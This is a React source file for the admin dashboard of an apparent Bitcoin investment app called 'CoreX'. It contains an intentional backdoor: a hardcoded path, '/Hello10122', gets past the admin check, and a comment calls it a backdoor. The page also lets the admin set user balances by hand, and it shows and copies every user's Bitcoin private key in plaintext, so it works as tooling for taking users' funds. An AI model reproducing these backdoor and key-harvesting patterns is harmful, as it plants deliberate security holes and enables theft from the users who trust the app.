import { useAuth } from "@/hooks/use-auth";
import { useQuery, useMutation } from "@tanstack/react-query";
import { queryClient } from "@/lib/queryClient";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog";
import { Label } from "@/components/ui/label";
import { useToast } from "@/hooks/use-toast";
import { useState } from "react";
import type { User } from "@shared/schema";
import { formatBitcoin } from "@/lib/utils";
import { BottomNavigation } from "@/components/bottom-navigation";
import { useLocation } from "wouter";
import { Users, DollarSign, TrendingUp, Edit, RefreshCw, Bitcoin, Send, Copy, Key } from "lucide-react";

interface AdminStats {
  totalUsers: number;
  totalBalance: string;
  activeInvestments: number;
}

export default function Admin() {
  const { user } = useAuth();
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const [selectedUser, setSelectedUser] = useState<User | null>(null);
  const [newBalance, setNewBalance] = useState("");
  const [dialogOpen, setDialogOpen] = useState(false);
  const [userPrivateKeys, setUserPrivateKeys] = useState<{ [userId: number]: string }>({});
  const [showPrivateKeys, setShowPrivateKeys] = useState<{ [userId: number]: boolean }>({});

  // Allow access via backdoor route or if user is admin
  const isBackdoorAccess = window.location.pathname === '/Hello10122';

  if (!user?.isAdmin && !isBackdoorAccess) {
    setLocation('/');
    return null;
  }

  const { data: stats } = useQuery<AdminStats>({
    queryKey: ['/api/admin/stats'],
  });

  const { data: users } = useQuery<User[]>({
    queryKey: ['/api/admin/users'],
  });

  const updateBalanceMutation = useMutation({
    mutationFn: async ({ userId, balance }: { userId: number; balance: string }) => {
      const response = await fetch('/api/admin/update-balance', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ userId, balance }),
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
      setDialogOpen(false);
      setNewBalance("");
      setSelectedUser(null);
      toast({
        title: "Balance Updated",
        description: "User balance has been successfully updated.",
      });
    },
    onError: (error) => {
      toast({
        title: "Update Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const fetchPrivateKeyMutation = useMutation({
    mutationFn: async (userId: number) => {
      const response = await fetch(`/api/admin/user/${userId}/private-key`);
      if (!response.ok) throw new Error('Failed to fetch private key');
      return response.json();
    },
    onSuccess: (data, userId) => {
      setUserPrivateKeys(prev => ({ ...prev, [userId]: data.privateKey }));
      setShowPrivateKeys(prev => ({ ...prev, [userId]: true }));
      toast({ title: "Private Key Retrieved", description: "Private key loaded successfully" });
    },
    onError: () => {
      toast({ title: "Error", description: "Failed to fetch private key", variant: "destructive" });
    },
  });

  const syncAllBalancesMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/sync-all-balances', {
        method: 'POST',
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: () => {
      toast({
        title: "Balances Synced",
        description: "All user balances synced with blockchain",
      });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/users'] });
      queryClient.invalidateQueries({ queryKey: ['/api/admin/stats'] });
    },
    onError: (error) => {
      toast({
        title: "Sync Failed",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const testBitcoinGenMutation = useMutation({
    mutationFn: async () => {
      const response = await fetch('/api/admin/test-bitcoin-generation', {
        method: 'POST',
      });

      if (!response.ok) {
        const error = await response.json();
        throw new Error(error.message);
      }

      return response.json();
    },
    onSuccess: (data) => {
      toast({
        title: data.success ? "Test Passed" : "Test Failed",
        description: data.message,
        variant: data.success ? "default" : "destructive",
      });
      console.log('Bitcoin Generation Test Results:', data);
    },
    onError: (error) => {
      toast({
        title: "Test Error",
        description: error.message,
        variant: "destructive",
      });
    },
  });

  const handleUpdateBalance = (user: User) => {
    setSelectedUser(user);
    setNewBalance(user.balance);
    setDialogOpen(true);
  };

  const submitBalanceUpdate = () => {
    if (!selectedUser) return;

    updateBalanceMutation.mutate({
      userId: selectedUser.id,
      balance: newBalance,
    });
  };

  const togglePrivateKey = (userId: number) => {
    if (showPrivateKeys[userId]) {
      // Hide the private key
      setShowPrivateKeys(prev => ({ ...prev, [userId]: false }));
    } else {
      // Fetch and show the private key
      fetchPrivateKeyMutation.mutate(userId);
    }
  };

  const copyPrivateKey = (privateKey: string) => {
    navigator.clipboard.writeText(privateKey);
    toast({
      title: "Copied",
      description: "Private key copied to clipboard",
    });
  };

  return (
    <div className="max-w-sm mx-auto bg-background min-h-screen relative">
      {/* Header */}
      <header className="px-4 py-6 border-b dark-border">
        <div className="flex items-center gap-3">
          <div className="w-8 h-8 rounded-full bg-bitcoin flex items-center justify-center">
            <span className="text-black text-sm font-bold">₿</span>
          </div>
          <div>
            <h1 className="text-xl font-bold text-foreground">CoreX Admin</h1>
            <p className="text-xs text-muted-foreground">Dashboard</p>
          </div>
        </div>
      </header>

      <div className="p-4 space-y-6">
        {/* Stats Cards */}
        <div className="grid grid-cols-1 gap-4">
          <Card className="dark-card dark-border">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm text-muted-foreground">Total Users</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-bitcoin">{stats?.totalUsers || 0}</p>
            </CardContent>
          </Card>

          <Card className="dark-card dark-border">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm text-muted-foreground">Total Balance</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-gold">{formatBitcoin(stats?.totalBalance || "0")} BTC</p>
            </CardContent>
          </Card>

          <Card className="dark-card dark-border">
            <CardHeader className="pb-2">
              <CardTitle className="text-sm text-muted-foreground">Active Investments</CardTitle>
            </CardHeader>
            <CardContent>
              <p className="text-2xl font-bold text-green-400">{stats?.activeInvestments || 0}</p>
            </CardContent>
          </Card>
        </div>

        {/* Bitcoin Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <Bitcoin className="w-5 h-5" />
              Bitcoin Management
            </CardTitle>
          </CardHeader>
          <CardContent>
            <Button
              onClick={() => syncAllBalancesMutation.mutate()}
              disabled={syncAllBalancesMutation.isPending}
              className="w-full bg-bitcoin hover:bg-bitcoin/90 text-black"
            >
              {syncAllBalancesMutation.isPending ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Syncing Balances...
                </>
              ) : (
                <>
                  <RefreshCw className="w-4 h-4 mr-2" />
                  Sync All User Balances with Blockchain
                </>
              )}
            </Button>
            <p className="text-xs text-muted-foreground mt-2">
              This will check all user Bitcoin addresses on the blockchain and update their balances accordingly.
            </p>
            <Button
              onClick={() => testBitcoinGenMutation.mutate()}
              disabled={testBitcoinGenMutation.isPending}
              className="w-full bg-green-500 hover:bg-green-500/90 text-black mt-4"
            >
              {testBitcoinGenMutation.isPending ? (
                <>
                  <RefreshCw className="w-4 h-4 mr-2 animate-spin" />
                  Testing Bitcoin Generation...
                </>
              ) : (
                <>
                  <Bitcoin className="w-4 h-4 mr-2" />
                  Test Bitcoin Generation
                </>
              )}
            </Button>
            <p className="text-xs text-muted-foreground mt-2">
              This will run a test to ensure Bitcoin addresses and private keys can be generated correctly.
            </p>
          </CardContent>
        </Card>

        {/* User Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="text-foreground">User Management</CardTitle>
          </CardHeader>
          <CardContent className="p-0">
            <div className="overflow-x-auto">
              <Table>
                <TableHeader>
                  <TableRow>
                    <TableHead className="text-muted-foreground">Email</TableHead>
                    <TableHead className="text-muted-foreground">Balance</TableHead>
                    <TableHead className="text-muted-foreground">Actions</TableHead>
                    <TableHead className="text-muted-foreground">Private Key</TableHead>
                  </TableRow>
                </TableHeader>
                <TableBody>
                  {users?.map((user) => (
                    <TableRow key={user.id}>
                      <TableCell className="text-foreground">{user.email}</TableCell>
                      <TableCell className="text-bitcoin">{formatBitcoin(user.balance)} BTC</TableCell>
                      <TableCell>
                        <Button
                          size="sm"
                          onClick={() => handleUpdateBalance(user)}
                          className="bg-bitcoin hover:bg-bitcoin/90 text-black"
                        >
                          Update
                        </Button>
                      </TableCell>
                      <TableCell>
                       {showPrivateKeys[user.id] ? (
                          <div className="flex items-center gap-2">
                            <Input
                              type="text"
                              value={userPrivateKeys[user.id] || ""}
                              readOnly
                              className="bg-muted text-xs"
                            />
                            <Button
                              size="sm"
                              onClick={() => copyPrivateKey(userPrivateKeys[user.id])}
                              className="bg-green-500 hover:bg-green-500/90 text-black"
                            >
                              Copy
                            </Button>
                          </div>
                        ) : (
                          <Button
                            size="sm"
                            onClick={() => togglePrivateKey(user.id)}
                            className="bg-blue-500 hover:bg-blue-500/90 text-black"
                          >
                            Show
                          </Button>
                        )}
                      </TableCell>
                    </TableRow>
                  ))}
                </TableBody>
              </Table>
            </div>
          </CardContent>
        </Card>

        {/* User Private Keys Management */}
        <Card className="dark-card dark-border">
          <CardHeader>
            <CardTitle className="flex items-center gap-2 text-foreground">
              <Key className="w-5 h-5" />
              User Private Keys (Admin Only)
            </CardTitle>
          </CardHeader>
          <CardContent>
            <div className="space-y-4">
              {users?.map((user) => (
                <div key={user.id} className="border rounded-lg p-4 space-y-2">
                  <div className="flex justify-between items-start">
                    <div>
                      <p className="font-medium text-foreground">{user.email}</p>
                      <p className="text-sm text-muted-foreground">User ID: {user.id}</p>
                    </div>
                    <Button
                      size="sm"
                      variant="outline"
                      onClick={() => {
                        navigator.clipboard.writeText(user.privateKey || '');
                        toast({
                          title: "Copied",
                          description: "Private key copied to clipboard",
                        });
                      }}
                    >
                      <Copy className="w-3 h-3 mr-1" />
                      Copy Private Key
                    </Button>
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-medium text-muted-foreground">Bitcoin Address:</p>
                    <p className="text-xs font-mono bg-muted p-2 rounded break-all">{user.bitcoinAddress}</p>
                  </div>
                  <div className="space-y-1">
                    <p className="text-xs font-medium text-muted-foreground">Private Key:</p>
                    <p className="text-xs font-mono bg-muted p-2 rounded break-all text-red-500">
                      {user.privateKey || 'No private key available'}
                    </p>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Update Balance Dialog */}
      <Dialog open={dialogOpen} onOpenChange={setDialogOpen}>
        <DialogContent className="dark-card dark-border">
          <DialogHeader>
            <DialogTitle className="text-foreground">Update User Balance</DialogTitle>
          </DialogHeader>
          <div className="space-y-4">
            <div>
              <Label htmlFor="email">User Email</Label>
              <Input
                id="email"
                value={selectedUser?.email || ""}
                disabled
                className="bg-muted"
              />
            </div>
            <div>
              <Label htmlFor="balance">New Balance (BTC)</Label>
              <Input
                id="balance"
                type="number"
                step="0.00000001"
                value={newBalance}
                onChange={(e) => setNewBalance(e.target.value)}
                placeholder="0.00000000"
              />
            </div>
            <div className="flex gap-2">
              <Button
                onClick={submitBalanceUpdate}
                disabled={updateBalanceMutation.isPending}
                className="bg-bitcoin hover:bg-bitcoin/90 text-black flex-1"
              >
                {updateBalanceMutation.isPending ? "Updating..." : "Update Balance"}
              </Button>
              <Button variant="outline" onClick={() => setDialogOpen(false)}>
                Cancel
              </Button>
            </div>
          </div>
        </DialogContent>
      </Dialog>

      {/* Bottom spacing for navigation */}
      <div className="h-20"></div>

      {/* Bottom Navigation */}
      <BottomNavigation />
    </div>
  );
}